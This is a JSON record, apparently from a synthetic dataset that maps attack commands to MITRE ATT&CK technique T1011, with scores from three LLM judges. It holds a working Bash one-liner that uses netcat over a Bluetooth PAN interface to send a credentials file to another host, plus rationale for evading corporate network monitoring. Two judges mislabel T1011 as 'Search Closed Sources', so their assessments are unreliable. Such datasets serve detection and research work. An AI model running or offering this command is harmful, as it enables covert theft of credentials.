@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
+  "explanation": "Uses Bluetooth PAN (bnep0) and UDP on a non-standard port to exfiltrate a blob while silently monitoring only that traffic. This is exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Select Bluetooth PAN to avoid the primary corporate network.",
+    "Use UDP on an uncommon port (53287) to blend with low-noise traffic.",
+    "Run tcpdump scoped to bnep0 and that port to minimize footprint.",
+    "Stream the file with netcat bound to the bnep0 source address."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-e5a3a6fa",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.",
+        "semantic_score": 2,
+        "semantic_justification": "The command attempts data exfiltration but is misaligned with T1011 (Search Closed Sources) as it describes exfiltration over a Bluetooth network rather than acquiring intelligence from non-public information sources like paid databases or dark markets.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T12:33:44.814378Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for all commands, flags, arguments, and shell operators.",
+        "semantic_score": 0,
+        "semantic_justification": "The command describes data exfiltration from a compromised system, which is fundamentally misaligned with MITRE ATT&CK T1011 'Search Closed Sources,' a technique focused on intelligence gathering from external closed sources.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T12:34:03.244764Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner uses valid separators, flags, and redirections with balanced syntax; both tcpdump and nc invocations are well-formed.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a file via UDP over a Bluetooth PAN interface and silently captures that port\u2019s traffic, but tcpdump typically requires elevated privileges and the netcat -s behavior may vary by implementation.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T12:34:18.447911Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
